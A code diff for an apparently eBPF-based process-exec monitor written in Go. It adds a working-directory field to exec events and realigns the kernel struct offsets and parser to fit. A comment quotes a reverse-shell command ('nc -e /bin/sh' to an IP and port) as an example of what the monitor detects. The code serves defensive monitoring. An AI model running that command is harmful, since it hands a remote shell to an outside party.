@@ -206,6 +206,11 @@ type ProcessEvent struct {
 	// as "nginx -> sh -> curl" than as "curl was denied".
 	Ancestry []Ancestor
 
+	// Cwd is the working directory the exec happened in. "nc run from /tmp"
+	// and "nc run from the application's install directory" are different
+	// findings. Empty when the kernel could not resolve it.
+	Cwd string
+
 	// Args is argv as captured on entry to the execve. It is what separates
 	// "nc ran" from "nc -e /bin/sh 10.0.0.1 4444". Args[0] is the program name
 	// as the caller passed it, which is not necessarily Filename.
@@ -1435,11 +1440,12 @@ const AncestryDepth = 4
 //	        __u32 pid; __u8 comm[16];
 //	} ancestry[4];
 //	__u8  filename[128];          // 144
-//	__u32 args_count;             // 272
-//	__u32 args_len;               // 276
-//	__u8  args_truncated;         // 280
-//	__u8  args[256];              // 281
-//	                              // 544 total
+//	__u8  cwd[128];               // 272
+//	__u32 args_count;             // 400
+//	__u32 args_len;               // 404
+//	__u8  args_truncated;         // 408
+//	__u8  args[256];              // 409
+//	                              // 672 total
 //
 // Spelled out as named constants because a wrong offset here decodes into
 // plausible-looking garbage rather than failing, which is exactly the kind of
@@ -1450,7 +1456,8 @@ const (
 	execOffAncestry  = 64
 	execAncestorSize = 20
 	execOffFilename  = execOffAncestry + AncestryDepth*execAncestorSize
-	execOffArgsCount = execOffFilename + 128
+	execOffCwd       = execOffFilename + 128
+	execOffArgsCount = execOffCwd + 128
 	execOffArgsLen   = execOffArgsCount + 4
 	execOffArgsTrunc = execOffArgsLen + 4
 	execOffArgs      = execOffArgsTrunc + 1
@@ -1480,6 +1487,7 @@ func parseProcessEvent(data []byte) *ProcessEvent {
 	ev.Comm = cut(data[execOffComm : execOffComm+16])
 	ev.ParentComm = cut(data[execOffParent : execOffParent+16])
 	ev.Filename = cut(data[execOffFilename : execOffFilename+128])
+	ev.Cwd = cut(data[execOffCwd : execOffCwd+128])
 
 	// argv, NUL separated exactly as /proc/<pid>/cmdline presents it.
 	ev.ArgsTruncated = data[execOffArgsTrunc] != 0
